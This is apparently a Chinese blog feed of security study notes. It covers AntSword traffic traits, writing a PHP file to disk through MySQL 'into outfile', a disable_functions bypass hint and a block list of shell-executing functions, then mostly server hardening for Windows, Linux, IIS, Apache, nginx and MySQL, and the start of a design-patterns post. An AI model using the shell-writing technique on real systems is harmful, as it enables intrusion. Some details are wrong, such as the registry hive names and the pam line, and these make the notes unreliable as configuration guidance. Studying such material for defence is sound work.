<p>蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以“_0x…&#x3D;”这种形式<br>————————————————<br>版权声明：本文为CSDN博主「Buffedon」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/weixin_46684578/article/details/118725385">https://blog.csdn.net/weixin_46684578/article/details/118725385</a></p>
<h1 id="八、MySQL"><a href="#八、MySQL" class="headerlink" title="八、MySQL"></a>八、MySQL</h1><h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><ul>
<li><code>select &#39;&lt;?php phpinfo()&gt; into outfile &#39;D:/shelltest.php&#39;</code></li>
<li><code>dumpfile</code></li>
<li><code>file_put_contents</code></li>
</ul>
<h2 id="写shell的条件？"><a href="#写shell的条件？" class="headerlink" title="写shell的条件？"></a>写shell的条件？</h2><ul>
<li><p>用户权限</p>
</li>
<li><p>目录读写权限</p>
</li>
<li><p>防止命令执行：<code>disable_functions</code>，禁止了<code>disable_functions=phpinfo,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</code>，但是可以用dl扩展执行命令或者ImageMagick漏洞 </p>
</li>
<li><p>open_basedir: 将用户可操作的文件限制在某目录下</p>
</li>
</ul>
<h1 id="九、mongodb、redis未授权"><a href="#九、mongodb、redis未授权" class="headerlink" title="九、mongodb、redis未授权"></a>九、mongodb、redis未授权</h1><h1 id="十、安全加固"><a href="#十、安全加固" class="headerlink" title="十、安全加固"></a>十、安全加固</h1><p>安全加固服务流程是怎么样的？</p>
<p>1、确定范围：确定资产范围，收集需要加固的信息系统涉及的主机、网络设备、数据库和中间件的信息，完成信息收集；</p>
<p>2、制定方案：制定安全加固方案，对加固范围内的资产进行安全评估，确认安全现状，制定加固措施形成加固方案；</p>
<p>3、确认与实施：与客户充分讨论安全加固方案、确认符合企业的需求的方案，实施安全加固方案；</p>
<p>4、服务交付：输出安全加固报告，保护企业信息安全，保证修复后业务正常运转。</p>
<p>安全加固主要有以下几个优势：</p>
<p>1、定制化;根据客户资产情况和需求，量身定制安全加固方案；</p>
<p>2、保证效果：安全加固方案及实施过程在实施前与客户充分讨论，保证实施效果；</p>
<p>3、专业服务：提供远程服务，如客户需要可提供驻场服务，保证企业信息安全。</p>
<p>安全加固可以做主机加固、数据库加固、中间件加固等服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">windows加固</span><br><span class="line">帐号加固：查看是否有其他用户、账号封禁删除</span><br><span class="line">本地安全策略：密码锁定、账户锁定、授权管理、审核策略(敏感操作记录、用户权限分配)</span><br><span class="line">补丁管理</span><br><span class="line">日志审核：查看事件查看器、查看id都表示什么事件</span><br><span class="line">Linux</span><br><span class="line">账号安全：禁止root用户直接远程ssh、Telnet登录，禁止无用的系统用户登录</span><br><span class="line">系统日志审计：syslog 登录事件记录、syslog.conf 的配置审核、启动审计进程</span><br><span class="line">关闭ipv6</span><br><span class="line">检查是否伪装IP</span><br></pre></td></tr></table></figure>

<h3 id="为什么需要安全加固"><a href="#为什么需要安全加固" class="headerlink" title="为什么需要安全加固"></a>为什么需要安全加固</h3><p>应用系统运行所需的软硬件，往往存在以下安全问题：</p>
<blockquote>
<p>安装、配置不符合安全需求<br>参数配置错误<br>使用、维护不符合安全需求<br>系统完整性被破坏<br>被注入木马程序<br>帐户&#x2F;口令问题<br>安全漏洞没有及时修补<br>应用服务和应用程序滥用<br>应用程序开发存在安全问题等</p>
</blockquote>
<h3 id="安全加固内容"><a href="#安全加固内容" class="headerlink" title="安全加固内容"></a>安全加固内容</h3><blockquote>
<p>正确的安装<br>安装最新和全部OS和应用软件的安全补丁<br>操作系统、系统软件、应用软件的安全配置<br>系统安全风险防范<br>提供系统使用和维护建议<br>系统功能测试<br>系统安全风险测试<br>系统完整性备份<br>必要时重建系统等</p>
</blockquote>
<h3 id="系统加固"><a href="#系统加固" class="headerlink" title="系统加固"></a>系统加固</h3><h4 id="Windows系统安全加固"><a href="#Windows系统安全加固" class="headerlink" title="Windows系统安全加固"></a>Windows系统安全加固</h4><table>
<thead>
<tr>
<th>netstat</th>
<th>查看开放端口</th>
</tr>
</thead>
<tbody><tr>
<td>secpol.msc</td>
<td>查看和修改本地安全设置</td>
</tr>
<tr>
<td>services.msc</td>
<td>查看和修改服务</td>
</tr>
<tr>
<td>eventvwr.msc</td>
<td>查看日志</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>net user&#x2F;localgroup&#x2F;share&#x2F;config</th>
<th>查看用户&#x2F;用户组&#x2F;共享&#x2F;当前运行可配置服务</th>
</tr>
</thead>
<tbody><tr>
<td>regedit</td>
<td>打开注册表</td>
</tr>
</tbody></table>
<h5 id="Windows账号及安全策略"><a href="#Windows账号及安全策略" class="headerlink" title="Windows账号及安全策略"></a>Windows账号及安全策略</h5><p><strong>账号安全设置</strong></p>
<blockquote>
<p>设置方法：“开始”—“运行”输入secpol.msc（控制面板——管理工具）<br>立即生效：gpupdate &#x2F;force</p>
</blockquote>
<p><strong>账号策略</strong></p>
<blockquote>
<p>密码必须符合复杂性要求：启用<br>密码长度最小值 8个字符<br>密码最长使用期限： 30天<br>强制密码历史： 3个记住的密码</p>
</blockquote>
<p><strong>账号锁定</strong></p>
<blockquote>
<p>帐户锁定阀值： 3次无效登陆<br>帐户锁定时间： 30分钟<br>复位帐户锁定计数器：30分钟之后</p>
</blockquote>
<p><strong>Administartor账号、组重命名</strong></p>
<p><strong>禁用Guest账户权限</strong></p>
<blockquote>
<p>我的电脑“右击”管理“打开—计算机管理—本地用户和组—用户—Guest—右键—属性—常规—选择“账户已禁用”</p>
<p>net user guest &#x2F;active:no</p>
</blockquote>
<p><strong>日志及审核策略</strong></p>
<p><strong>安全选项策略设置</strong></p>
<p><strong>用户权限策略设置</strong></p>
<blockquote>
<ul>
<li>通过终端服务拒绝登陆”中加入Guests、User组</li>
<li>“通过终端服务允许登陆”中只加入Administrators组</li>
<li>“从网络访问此计算机”中删除PowerUsers和BackupOperators</li>
<li>“拒绝本地登录”中添加web和guest用户</li>
</ul>
</blockquote>
<h5 id="NTFS安全"><a href="#NTFS安全" class="headerlink" title="NTFS安全"></a>NTFS安全</h5><p>文件系统又被称作文件管理系统,负责为用户建立文件，存入、读出、修改、转储文件，控制文件的存取，当用户不再使用时撤销文件等。</p>
<p><strong>Windows权限的继承性、累加性、优先性、交叉性四项基本原则</strong></p>
<blockquote>
<p>继承性：下级的目录在没有经过重新设置之前，是拥有上一级目录权限设置的。</p>
<p>累加性：是说如一个组GROUP1中有两个用户USER1、USER2，他们同时对某文件或目录的访问权限分别为“读取”和“写入”，那么组GROUP1对该文件或目录的访问权限就为USER1和USER2的访问权限之和。<br>        优先性：权限的这一特性又包含两种子特性，其一是<strong>文件的访问权限优先目录</strong>的权限，也就是说文件权限可以越过目录的权限，不顾上一级文件夹的设置。另一特性就是<strong>“拒绝”权限优先其它权限</strong>，也就是说“拒绝”权限可以越过其它所有其它权限，一旦选择了“拒绝”权限，则其它权限也就不能取任何作用，相当于没有设置。<br>        交叉性：指当同一文件夹在为某一用户<strong>设置了共享权限</strong>的同时又为用户设置了<strong>该文件夹的访问权限</strong>，且所设权限不一致时，它的取舍原则是取两个权限的交集，也即最严格、最小的那种权限。如<strong>目录A为用户USER1设置的共享权限为“只读”</strong>，<strong>同时目录A为用户USER1设置的访问权限为“完全控制</strong>”，那用户USER1的最终访问权限为“<strong>只读</strong>”。</p>
</blockquote>
<p><strong>权限设置</strong></p>
<blockquote>
<p>系统分区C盘				                  administrator、system完全控制<br>C:\Documents and Settings\			     administrator、system完全控制<br>C:\windows\system32\		             administrator读写<br>C:\progran files	为Common File目录之外的所有目录赋予Administrators 和SYSTEM 完全控制<br>C:\windows			系统管理员完全控制、system拒绝(继承)<br>C:\windows\system32	其关键程序只允许administrator完全控制<br>C:\Inetpub\			administrator、system完全控制，必要时可以删除该目录<br>网站目录所在磁盘	   administrator、system完全控制</p>
</blockquote>
<p><strong>注册表安全设置</strong></p>
<p>通过注册表，用户可以轻易地添加、删除、修改windows系统内的软件配置信息或硬件驱动程序</p>
<blockquote>
<p>HKEY_LOCAL_MACHINE   包含关于本地计算机系统的信息，包括硬件和操作系统数据。<br>HKEY_LOCAL_ROOT          包含各种OLE技术使用的信息技术和文件类别关联数据<br>HKEY_LOCAL_USER           包含环境变量、桌面设置、网络连接、打印机和程序首选项。<br>HKEY_LOCAL_USERS         包含关于动态加载的用户配置文件和默认的配置文件的信息，有些信息和HKEY_CURRENT_USER交叉出现<br>HKEY_CURRENT_CONFIG  包含在启动时由本地计算机系统使用的硬件配置文件的相关信息。</p>
</blockquote>
<p><strong>禁止自动登录</strong></p>
<p><strong>启用源路由欺骗保护</strong></p>
<p><strong>禁止空链接</strong></p>
<p><strong>删除系统默认共享</strong></p>
<p><strong>修改默认3389远程端口</strong></p>
<p><strong>关闭135.139.445隐患端口</strong></p>
<h4 id="Linux系统安全加固"><a href="#Linux系统安全加固" class="headerlink" title="Linux系统安全加固"></a>Linux系统安全加固</h4><p><strong>系统用户</strong></p>
<blockquote>
<p>账号分类：<br>超级管理员	 uid&#x3D;0,<br>系统默认用户	系统程序使用，从不登录<br>新建普通用户	uid大于500</p>
</blockquote>
<p><strong>&#x2F;etc&#x2F;password</strong> </p>
<blockquote>
<p>名称 密码字串 uid gid 用户全名 宿主目录 登录shell路径</p>
</blockquote>
<p><strong>&#x2F;etc&#x2F;shadow</strong></p>
<blockquote>
<p>名称 加密后的密码字串 上次修改时间…</p>
</blockquote>
<p><strong>liunx用户管理</strong></p>
<blockquote>
<p>#添加用户<br>useradd &lt;用户名&gt;<br>#删除用户<br>userdel [-r][-f] &lt;用户名&gt;</p>
<p>#锁定&#x2F;解锁用户<br>passwd -l &lt;用户名&gt;<br>passwd -u &lt;用户名&gt;</p>
<p>#用户属性<br>usermod -L  &lt;用户名&gt;锁定用户<br>usermod -U &lt;用户名&gt;解锁用户</p>
<p>#查看当前用户<br>id</p>
</blockquote>
<p><strong>解析文件权限</strong></p>
<p>ls -l</p>
<p><strong>文件系统安全</strong></p>
<p>chmod 777 test</p>
<p><strong>设置合理的初始文件权限</strong></p>
<p><strong>linux提权漏洞</strong></p>
<p>由于Linux 内核的内存子系统在处理 Copy-on-Write 时出现竞争条件（漏洞），导致私有的只读内存映射被破坏、获取读写权限后低权限用户可以进一步提权。</p>
<p>防御：升级内核</p>
<p><strong>锁定系统中多余的自建帐号</strong></p>
<blockquote>
<p>对于一些保留的系统伪帐户如：bin, sys，</p>
<p>adm，uucp，lp, nuucp，hpdb, www, daemon等可根据需要锁定登陆。</p>
<p>加固方法:<br>　　使用命令passwd -l &lt;用户名&gt;锁定不必要的账号。</p>
<p>使用命令passwd -u &lt;用户名&gt;解锁需要恢复的账号。</p>
</blockquote>
<p><strong>检查shadow中空口令帐号</strong></p>
<p><code>awk -F &quot;:&quot; &#39;($2==&quot;!&quot;)&#123;print $1&#125;&#39; /etc/shadow</code></p>
<p>加固：</p>
<blockquote>
<p>#锁定不必要的账户<br>passwd -l &lt;用户名&gt;</p>
<p>#解锁需要恢复的账户<br>passwd -u &lt;用户名&gt;</p>
<p>#为用户设置密码<br>passwd &lt;用户名&gt;</p>
</blockquote>
<p><strong>设置系统密码策略</strong></p>
<blockquote>
<p>执行命令<br>cat &#x2F;etc&#x2F;login.defs|grep PASS  #查看密码策略设置<br>加固方法：<br>vi &#x2F;etc&#x2F;login.defs修改配置文件<br>    PASS_MAX_DAYS		90	   #用户的密码最长使用天数<br>    PASS_MIN_DAYS		0	   #两次修改密码的最小时间间隔<br>    PASS_MIN_LEN		7	   #密码的最小长度<br>    PASS_WARN_AGE	9       #密码过期前多少天开始提示</p>
</blockquote>
<p><strong>禁用root之外的超级用户</strong></p>
<p><strong>限制能够su为root的用户</strong></p>
<p><strong>重要文件加上不可改变属性</strong></p>
<h5 id="ssh安全"><a href="#ssh安全" class="headerlink" title="ssh安全"></a>ssh安全</h5><p><strong>禁止root用户进行远程登录</strong></p>
<p>该端口或关权限</p>
<p><strong>屏蔽SSH登录banner信息</strong></p>
<p><strong>设置账户锁定登录失败锁定次数锁定时间</strong></p>
<blockquote>
<p><code>cat /etc/pam.d/system-auth|grep auth </code></p>
<p>#设置为密码连续错误6次，锁定时间300秒<br>vi &#x2F;etc&#x2F;pam.d&#x2F;system-auth<br>auth required pam_tally.so oneer&#x3D;filad deny&#x3D;6 unlock_time&#x3D;300 </p>
<p>解锁用户：<code>faillog -u &lt;用户名&gt; -r</code></p>
</blockquote>
<p><strong>修改账户TMOUT值，设置自动注销时间</strong></p>
<blockquote>
<p>#查看有无TMOUT的设置<br>cat &#x2F;etc&#x2F;profile|grep TMOUT </p>
<p>加固：vim &#x2F;etc&#x2F;profile</p>
<p>添加TMOUT&#x3D;600 </p>
<p>无操作600秒后自动退出</p>
</blockquote>
<p><strong>设置系统日志策略配置文件</strong></p>
<blockquote>
<p>ps -aef | grep syslog #确定syslog服务是否启用<br>cat &#x2F;etc&#x2F;rsyslog.conf #查看syslogd的配置，并确认日志文件日否存在</p>
<p>#系统日志 (默认)<br>&#x2F;var&#x2F;log&#x2F;messages<br>#cron日志 (默认)<br>&#x2F;var&#x2F;log&#x2F;cron<br>#安全日志 (默认)<br>&#x2F;var&#x2F;log&#x2F;secure</p>
</blockquote>
<p><strong>阻止系统响应任何从外部&#x2F;内部来的ping请求</strong></p>
<p><code>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all</code></p>
<p>如此其它客户端无法ping通</p>
<h3 id="中间件加固"><a href="#中间件加固" class="headerlink" title="中间件加固"></a>中间件加固</h3><h4 id="IIS加固"><a href="#IIS加固" class="headerlink" title="IIS加固"></a>IIS加固</h4><p>如网站正常运行只需要ASP环境，那我们就没必要安装.net组件。<br>对于IIS版本，至少要在6.0以上</p>
<p><strong>删除默认网站</strong></p>
<p>把IIS默认安装的站点删除或禁用掉</p>
<p><strong>禁用不必要的Web服务扩展</strong> </p>
<p>如webdev、asp.net</p>
<p><strong>删除不使用的应用程序扩展</strong></p>
<p>只保留必要的应用程序扩展，其他的一律删除，尤其是像cer、asa这样</p>
<p><strong>IIS访问权限配置</strong></p>
<blockquote>
<p>如果IIS中有多个网站，建议为每个网站配置不同的匿名访问账户。<br>方法：<br>a. 新建一个账号，加入Guests组<br>b. “网站属性”—&gt;“目录安全性”—&gt;“身份验证和访问控制”，把“启用匿名访问”处，用刚新建的账户代替默认账户。</p>
</blockquote>
<p><strong>正确设置网站目录的权限和IIS权限</strong></p>
<blockquote>
<p>网站分区为NTFS分区。网站目录出system和administrator组有完全控制权限外，其他用户只需要有读取权限。</p>
<p>IIS6管理器中设置：</p>
<ul>
<li>只选择“读取、记录访问、索引资源”</li>
<li>禁止“写入”和“脚本资源访问”，避免IIS Put上传攻击。</li>
<li>禁止“目录浏览”，避免目录遍历攻击。</li>
</ul>
</blockquote>
<blockquote>
<p>应用程序设置中的执行权限设置为“纯脚本”</p>
<p>原则</p>
<ul>
<li>目录有写入权限，一定不要分配执行权限</li>
<li>目录有执行权限，一定不要分配写入权限</li>
<li>网站上传目录和数据库目录一般需要分配“写入”权限，但一定不要分配执行权限</li>
<li>其他目录一般只分配“读取”和“记录访问”权限即可。</li>
</ul>
</blockquote>
<p><strong>设置IP访问限制</strong></p>
<p><strong>正确设置IIS日志</strong></p>
<p>在IIS管理器中，右击网站“属性”，点击网站选项卡，确定已经选择“启用日志记录”，活动日志格式为“W3C扩充日志文件格式”。<strong>自定义日志路径</strong>，且只允许Administrators组用户和SYSTEM用户访问。</p>
<p><strong>自定义IIS返回的错误信息</strong></p>
<p><strong>禁止向客户端发送详细的ASP错误信息</strong></p>
<p>在IIS管理器中—&gt;“属性”—&gt;“主目录”—&gt;“配置”—&gt;“调试”，选择“向客户端发送下列文本错误消息”项，自定义出错时返回的错误信息</p>
<h4 id="Apache安全加固"><a href="#Apache安全加固" class="headerlink" title="Apache安全加固"></a>Apache安全加固</h4><p><strong>隐藏Apache banner信息</strong></p>
<blockquote>
<p>vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf<br>#在出现错误页的时候不显示服务器操作系统的名称<br>ServerTokens OS　 修改为：ServerTokens Prod<br>#不回显apache版本信息<br>ServerSignature On 	修改为：ServerSignature Off </p>
</blockquote>
<p><strong>禁止目录浏览</strong></p>
<p>Options Indexes FollowSymLinks</p>
<p>修改为：</p>
<p>vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf<br>Options  FollowSymLinks</p>
<p><strong>限制IP访问</strong></p>
<p><strong>限制禁止访问的文件夹，例如后台目录</strong></p>
<p><strong>防止Apache的解析漏洞</strong></p>
<p>这种解析特性经常被用来绕过Web应用的文件上传检测。</p>
<p>通过<strong>禁止httpd解析文件</strong>，禁止httpd解析index.php.jpg文件</p>
<blockquote>
<p>&lt;FilesMatch .php$&gt;<br>    SetHandler application&#x2F;x-httpd-php<br>&lt;/FilesMatch&gt;<br>&lt;FilesMatch “.phps$”&gt;<br>    SetHandler application&#x2F;x-httpd-php-source<br>&lt;&#x2F;FilesMatch&gt;</p>
</blockquote>
<p><strong>错误页面重定向</strong></p>
<p>在.htaccess 文件中加入如下内容即可：</p>
<blockquote>
<p>ErrorDocument 400 &#x2F;custom400.html<br>ErrorDocument 401 &#x2F;custom401.html<br>ErrorDocument 403 &#x2F;custom403.html<br>ErrorDocument 404 &#x2F;custom404.html<br>ErrorDocument 405 &#x2F;custom405.html<br>ErrorDocument 500 &#x2F;custom500.html Customxxx.html 为要设置的错误页面。</p>
</blockquote>
<p><strong>日志设置</strong></p>
<p>编辑 httpd.conf 配置文件，设置日志记录文件、记录内容、记录 格式。其中，错误日志：</p>
<blockquote>
<p>LogLevel notice				#日志的级别<br>ErrorLog  logs&#x2F;error_log 	#日志的保存位置（错误日志）</p>
</blockquote>
<p>访问日志：</p>
<blockquote>
<p>LogFormat %h %l %u %t \”%r\” %&gt;s %b “%{Accept}i\”%{Referer}i\” \”%{User-Agent}i\””<br>combined<br>CustomLog  logs&#x2F;access_log combined （访问日志）</p>
</blockquote>
<p><strong>拒绝服务防范</strong></p>
<p>合理设置 session 时间，防止拒绝服务攻击</p>
<blockquote>
<p>vim httpd.conf 配置文件</p>
<p>Timeout 10 		#客户端与服务器端建立连接前的时间间隔<br>KeepAlive On<br>KeepAliveTimeout 15 #限制每个 session 的保持时间是 15 秒 </p>
</blockquote>
<p><strong>禁用CGI</strong></p>
<p>如果服务器上不需要运行 CGI 程序，建议禁用 CGI<br>修改配置vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf，把 cgi-bin 目录的配置和模块都注释掉</p>
<blockquote>
<p>#LoadModule cgi_module modules&#x2F;mod_cgi.so<br>#ScriptAlias &#x2F;cgi-bin&#x2F; “&#x2F;var&#x2F;www&#x2F;cgi-bin&#x2F;“<br>#&lt;Directory “&#x2F;var&#x2F;www&#x2F;cgi-bin”&gt;<br>AllowOverride None</p>
<p>#Options None </p>
<p>#Order allow,deny</p>
<p>#Allow from all</p>
<p>#&lt;&#x2F;Directory&gt;</p>
</blockquote>
<p><strong>防止SQL注入及远程包含</strong></p>
<p>php.ini中有一个设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">magic_quotes_gpc = Off	改为     magic_quotes_gpc = On</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>在远程文件包含漏洞中，攻击者可以通过访问外部地址来加载远程代码，所以一定要设置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">allow_url_fopen = off</span><br></pre></td></tr></table></figure>

<h4 id="nginx服务器安全加固"><a href="#nginx服务器安全加固" class="headerlink" title="nginx服务器安全加固"></a>nginx服务器安全加固</h4><p><strong>禁用autoindex</strong></p>
<p>确保nginx.conf配置文件上禁用autoindex，即autoindex off或者没有配置autoindex</p>
<p><strong>关闭服务器标记</strong></p>
<p>如果开启的话（默认情况下）所有的错误页面都会显示服务器的版本和信息。nginx.conf配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">    include       naxsi_core.rules;</span><br><span class="line">    include      mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    server_tokens off;</span><br><span class="line">... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>同时修改<code>/usr/local/nginx/conf/fastcgi_params</code><br>将里面的<br><code>fastcgi_param SERVER_SOFTWARE nginx/$nginx_version;</code><br>修改为：<br><code>fastcgi_param SERVER_SOFTWARE nginx;</code></p>
<p><strong>自定义缓存</strong></p>
<p>设置自定义缓存以<strong>限制缓冲区溢出攻击</strong>。nginx.conf配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http&#123;</span><br><span class="line">    ... ...</span><br><span class="line">    server&#123;</span><br><span class="line">        ... ...</span><br><span class="line">        client_body_buffer_size  16K;</span><br><span class="line">       client_header_buffer_size  1k;</span><br><span class="line">        client_max_body_size  1m;</span><br><span class="line">       large_client_header_buffers  4  8k;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="timeout设置"><a href="#timeout设置" class="headerlink" title="timeout设置"></a>timeout设置</h5><p>设置timeout设低来防御DOS攻击，nginx.conf配置如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    ... ...</span><br><span class="line">       client_body_timeout   10;</span><br><span class="line">       client_header_timeout  30;</span><br><span class="line">       keepalive_timeout     30  30;</span><br><span class="line">       send_timeout          10;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="配置日志"><a href="#配置日志" class="headerlink" title="配置日志"></a><strong>配置日志</strong></h5><h5 id="限制访问"><a href="#限制访问" class="headerlink" title="限制访问"></a>限制访问</h5><p>nginx.conf配置，只接收get和post</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server&#123;</span><br><span class="line">       ... ...</span><br><span class="line">       if($request_method !~ ^(GET|HEAD|POST)$) &#123;        </span><br><span class="line">                     return404;</span><br><span class="line">              &#125;</span><br><span class="line">       ... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="限制访问IP"><a href="#限制访问IP" class="headerlink" title="限制访问IP"></a>限制访问IP</h5><p>模块 ngx_http_access_module 允许限制某些IP地址的客户端访问。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location/ &#123;</span><br><span class="line">    deny  192.168.1.1;</span><br><span class="line">    allow 192.168.1.0/24;</span><br><span class="line">    allow 10.1.1.0/16;</span><br><span class="line">    allow 2001:0db8::/32;</span><br><span class="line">    deny  all;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="数据库加固"><a href="#数据库加固" class="headerlink" title="数据库加固"></a><strong>数据库加固</strong></h3><h4 id="Mysql数据库安全加固"><a href="#Mysql数据库安全加固" class="headerlink" title="Mysql数据库安全加固"></a>Mysql数据库安全加固</h4><h5 id="删除默认数据库和数据库用户"><a href="#删除默认数据库和数据库用户" class="headerlink" title="删除默认数据库和数据库用户"></a>删除默认数据库和数据库用户</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">mysql&gt; drop database test; 		#删除数据库test</span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; delete from db;          #删除存放数据库的表信息，因为还没有数据库信息。</span><br><span class="line">mysql&gt; delete from user where not (user=&#x27;root&#x27;);       #删除初始非root的用户</span><br><span class="line">mysql&gt; delete from user where user=&#x27;root&#x27; and password=&#x27;&#x27;; #删除空密码的root尽量重复操作</span><br><span class="line">mysql&gt; flush privileges; 		#强制刷新内存授权表。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="不使用默认密码和弱口令"><a href="#不使用默认密码和弱口令" class="headerlink" title="不使用默认密码和弱口令"></a>不使用默认密码和弱口令</h5><p>检查账户默认密码和弱口令，口令长度至少8位，并包括数字、小写字母、大写字母和特殊符号四类中至少两种。且5次以内不得设置相同的口令，密码应至少90天更换一次。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mysql&gt; Update user set password=password(‘test!p3’) where user=‘root’;</span><br><span class="line">Mysql&gt; Flush privileges;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h5 id="改变默认mysql管理员帐号"><a href="#改变默认mysql管理员帐号" class="headerlink" title="改变默认mysql管理员帐号"></a>改变默认mysql管理员帐号</h5><p>mysql&gt; update mysql.user set user&#x3D;’admin’ where user&#x3D;’root’;</p>
<h5 id="禁止远程连接数据库"><a href="#禁止远程连接数据库" class="headerlink" title="禁止远程连接数据库"></a>禁止远程连接数据库</h5><p>默认3306打开</p>
<blockquote>
<p>vi &#x2F;etc&#x2F;my.cf       #将#skip-networking注释去掉</p>
</blockquote>
<h5 id="限制用户连接的数量"><a href="#限制用户连接的数量" class="headerlink" title="限制用户连接的数量"></a>限制用户连接的数量</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi /etc/my.cnf</span><br><span class="line">[mysqld]</span><br><span class="line">max_user_connections=2</span><br></pre></td></tr></table></figure>



<h1 id="十一、Mysql索引"><a href="#十一、Mysql索引" class="headerlink" title="十一、Mysql索引"></a>十一、Mysql索引</h1><p>用于实现数据的快速检索。</p>
<h4 id="顺序访问"><a href="#顺序访问" class="headerlink" title="顺序访问"></a>顺序访问</h4><p>顺序访问是在表中实行全表扫描，从头到尾逐行遍历，直到在无序的行数据中找到符合条件的目标数据。</p>
<h4 id="索引访问"><a href="#索引访问" class="headerlink" title="索引访问"></a>索引访问</h4><p>索引访问是通过遍历索引来直接访问表中记录行的方式。</p>
<p>使用这种方式的前提是对表建立一个索引，在列上创建了索引之后，查找数据时可以直接根据该列上的索引找到对应记录行的位置，从而快捷地查找到数据。索引存储了指定列数据值的指针，根据指定的排序顺序对这些指针排序。</p>
<p>查询数据时不用读完记录的所有信息，而只是查询索引列</p>
<h1 id="12、GPC是什么？GPC之后怎么绕过？"><a href="#12、GPC是什么？GPC之后怎么绕过？" class="headerlink" title="12、GPC是什么？GPC之后怎么绕过？"></a>12、GPC是什么？GPC之后怎么绕过？</h1>]]></content>
      <categories>
        <category>网安</category>
      </categories>
      <tags>
        <tag>应急响应</tag>
        <tag>网安</tag>
        <tag>同源策略</tag>
        <tag>前端跨域</tag>
        <tag>APT</tag>
        <tag>javascript</tag>
        <tag>爬虫</tag>
        <tag>风险评估</tag>
        <tag>webshell</tag>
        <tag>安全加固</tag>
        <tag>DDOS</tag>
        <tag>shell/webshell</tag>
        <tag>cookie/session/token(jwt)</tag>
      </tags>
  </entry>
  <entry>
    <title>代码设计模式</title>
    <url>/2023/08/13/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h1><p>设计模式是软件开发人员在软件开发过程中面临的一般问题的解决方案</p>
<p>分为三大类：</p>
<blockquote>
<p>创建型模式:</p>
<p><strong>对象实例化的模式，创建型模式用于解耦对象的实例化过程</strong></p>
<p>结构型模式:</p>
<p><strong>把类或对象结合在一起形成一个更大的结构</strong></p>
<p>行为模式:</p>
<p><strong>类和对象如何交互，及划分责任和算法</strong></p>
</blockquote>
<p>共23种</p>
<p>其中c++常见的10种有：单例、工厂方法、抽象工厂、建造者、原型、适配器、桥接、组合、装饰器、外观模式</p>
<h1 id="一、创建型模式"><a href="#一、创建型模式" class="headerlink" title="一、创建型模式"></a>一、创建型模式</h1><p>创建型模式的作用就是创建对象，说到创建一个对象，最熟悉的就是 new 一个对象，然后 set 相关属性。但是，在很多场景下，我们需要给<strong>客户端提供更加友好的创建对象的方式</strong>，尤其是那种我们定义了类，但是<strong>需要提供给其他开发者用</strong>的时候。</p>
<h2 id="1-Factory模式-工厂"><a href="#1-Factory模式-工厂" class="headerlink" title="1.Factory模式(工厂)"></a>1.Factory模式(工厂)</h2><h3 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h3><ul>
<li>抽象出一些类的公共接口以形成抽象基类或者接口，</li>
</ul>
<p>这样我们可以通过声明一个指向基类的指针来指向实际的子类实现，达到了<strong>多态</strong>的目的。</p>
<p>因此<strong>需要</strong>在用到子类的地方写new对象。</p>
<p><strong>所以实体类的使用者必须知道实际的子类名称</strong>，</p>
<p>使得程序的<code>扩展性和维护性</code>越来越困难</p>
<ul>
<li>在父类中并不知道<strong>具体要实例化</strong>哪一个具体的子类</li>
</ul>
<p><code>只能在父类中写方法调用</code>，具体调用哪一个类的方法交给子类实现。</p>
<h3 id="该模式的重要功能"><a href="#该模式的重要功能" class="headerlink" title="该模式的重要功能"></a>该模式的重要功能</h3><ol>
<li>定义创建对象的接口，封装了对象的创建</li>
<li>使得具体化类的工作延迟到了子类</li>
</ol>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>这里应用了智能指针，对象使用一旦超出作用域就可以释放对象</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;memory&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Product</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Product</span>() &#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span 